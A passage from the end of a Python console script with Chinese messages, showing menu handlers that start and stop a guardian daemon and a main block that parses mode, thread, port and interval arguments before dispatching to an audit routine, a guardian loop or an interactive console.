                    ps,
                    "0.05",
                    "20",
                    "256",
                ],
                start_new_session=True,
            )
            print(f"{C_SUCC}>>> 守护进程已启动{C_W}")
            time.sleep(1)

        elif c == "8":
            gpid = load_state(GUARDIAN_STATE_FILE).get("pid")
            if stop_process(gpid):
                print(f"{C_WARN}>>> 守护进程已停止{C_W}")
            else:
                print(f"{C_DIM}没有运行中的守护{C_W}")
            time.sleep(1)

        elif c == "9":
            break


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "run":
        # ... (参数解析逻辑保持一致)
        if len(sys.argv) < 7:
            raise SystemExit("参数不足")
        mode, work_mode, threads = int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])
        ports, feed_int = parse_ports(sys.argv[5]), float(sys.argv[6])
        if (
            mode not in (1, 2, 3)
            or work_mode not in (1, 2, 3)
            or threads < 1
            or not ports
            or feed_int < 0
        ):
            raise SystemExit("Err")
        asyncio.run(internal_audit_process(mode, work_mode, threads, ports, feed_int))
    elif len(sys.argv) > 1 and sys.argv[1] == "guardian":
        # ... (参数解析逻辑保持一致)
        if len(sys.argv) < 6:
            raise SystemExit("参数不足")
        try:
            mode, work_mode, threads, ports_str = (
                int(sys.argv[2]),
                int(sys.argv[3]),
                int(sys.argv[4]),
                sys.argv[5],
            )
            feed_int = float(sys.argv[6]) if len(sys.argv) > 6 else 0.05
            check_interval = float(sys.argv[7]) if len(sys.argv) > 7 else 20.0
            min_free_mb = float(sys.argv[8]) if len(sys.argv) > 8 else 256.0
            run_guardian(
                mode,
                work_mode,
                threads,
                ports_str,
                feed_int,
                check_interval,
                min_free_mb,
            )
        except ValueError:
            raise SystemExit("Err")
    else:
        main_console()
